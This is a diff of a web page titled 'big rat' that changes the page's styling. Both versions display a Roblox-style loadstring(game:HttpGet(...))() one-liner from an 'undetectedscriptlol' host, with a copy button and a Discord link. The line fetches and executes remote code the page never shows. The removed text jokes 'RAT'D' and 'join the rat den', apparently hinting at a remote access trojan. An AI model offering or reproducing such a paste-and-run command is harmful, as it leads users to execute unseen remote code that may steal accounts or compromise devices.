@@ -6,133 +6,96 @@
     <title>big rat</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&display=swap');
-        
         body { 
-            background-color: #000; 
-            font-family: 'Courier Prime', monospace; 
-            color: #0f0; 
+            background-color: #ffffff; 
+            font-family: "Arial", sans-serif; 
+            color: #000000; 
             margin: 0;
-            padding: 0;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            overflow: hidden;
-        }
-
-        .rat-container {
-            position: relative;
-            margin-bottom: 2rem;
+            padding-top: 50px;
         }
 
         .big-rat {
-            width: 400px;
-            max-width: 80vw;
-            animation: rat-spin 4s infinite linear, rat-shake 0.1s infinite;
-            filter: drop-shadow(0 0 30px #0f0);
-        }
-
-        @keyframes rat-spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-
-        @keyframes rat-shake {
-            0% { translate: 2px 2px; }
-            50% { translate: -2px -2px; }
-            100% { translate: 2px -2px; }
-        }
-
-        .copy-box {
-            background: #111;
-            border: 2px solid #0f0;
-            padding: 1rem;
-            border-radius: 4px;
-            font-size: 0.8rem;
-            margin-bottom: 1.5rem;
+            width: 600px; /* Enormous */
             max-width: 90vw;
-            overflow-x: auto;
-            white-space: nowrap;
+            height: auto;
+            margin-bottom: 20px;
         }
 
-        .troll-btn {
-            background: #0f0;
-            color: #000;
-            padding: 20px 40px;
-            font-size: 1.5rem;
-            font-weight: 900;
-            border: none;
+        .copy-container {
+            text-align: center;
+            width: 100%;
+            max-width: 600px;
+        }
+
+        .script-display {
+            background: #f0f0f0;
+            border: 1px solid #ccc;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .classic-button {
+            background: #e1e1e1;
+            border: 1px solid #707070;
+            padding: 8px 24px;
+            font-size: 16px;
             cursor: pointer;
-            text-transform: uppercase;
-            box-shadow: 0 0 20px #0f0;
+            color: black;
         }
 
-        .troll-btn:active {
-            transform: scale(0.9);
-            background: #fff;
+        .classic-button:hover {
+            background: #d5d5d5;
+            border-color: #000;
         }
 
-        .discord-btn {
-            margin-top: 30px;
-            color: #5865F2;
-            text-decoration: none;
-            font-size: 1.2rem;
-            border: 1px solid #5865F2;
-            padding: 8px 16px;
+        .classic-button:active {
+            background: #afafaf;
         }
 
-        .discord-btn:hover {
-            background: #5865F2;
-            color: #fff;
-        }
-
-        #status-text {
-            margin-top: 10px;
-            font-size: 0.9rem;
-            height: 20px;
+        .discord-link {
+            margin-top: 40px;
+            color: blue;
+            text-decoration: underline;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
 
-    <h1 style="font-size: 3rem; margin-bottom: 20px;">big rat</h1>
+    <h1 style="font-size: 48px; font-weight: bold; margin-bottom: 10px;">big rat</h1>
 
-    <div class="rat-container">
-        <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji/assets/svg/1f400.svg" class="big-rat" alt="RAT">
+    <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji/assets/svg/1f400.svg" class="big-rat" alt="RAT">
+
+    <div class="copy-container">
+        <code class="script-display" id="script-path">
+            loadstring(game:HttpGet("https://undetectedscriptlol.vercel.app/api/v7"))()
+        </code>
+        
+        <button class="classic-button" onclick="copyScript()">
+            Copy Script
+        </button>
     </div>
 
-    <div class="copy-box">
-        <code id="script-path">loadstring(game:HttpGet("https://undetectedscriptlol.vercel.app/api/v7"))()</code>
-    </div>
-
-    <button class="troll-btn" onclick="copyScript()">
-        COPY SCRIPT
-    </button>
-
-    <p id="status-text"></p>
-
-    <a href="https://discord.gg/xmGsMdAeTQ" target="_blank" class="discord-btn">
-        join the rat den
+    <a href="https://discord.gg/xmGsMdAeTQ" target="_blank" class="discord-link">
+        discord server
     </a>
 
     <script>
-        // Set dynamic URL
-        const scriptUrl = `loadstring(game:HttpGet("https://${window.location.host}/api/v7"))()`;
-        document.getElementById('script-path').innerText = scriptUrl;
+        // Update URL to match current host automatically
+        const currentUrl = `loadstring(game:HttpGet("https://${window.location.host}/api/v7"))()`;
+        document.getElementById('script-path').innerText = currentUrl;
 
         function copyScript() {
             const text = document.getElementById('script-path').innerText;
             navigator.clipboard.writeText(text);
-            
-            const status = document.getElementById('status-text');
-            status.innerText = "COPIED TO CLIPBOARD 🐀";
-            
-            // Random chance for an alert
-            if(Math.random() > 0.5) {
-                alert("RAT'D");
-            }
+            alert("copied");
         }
     </script>
 
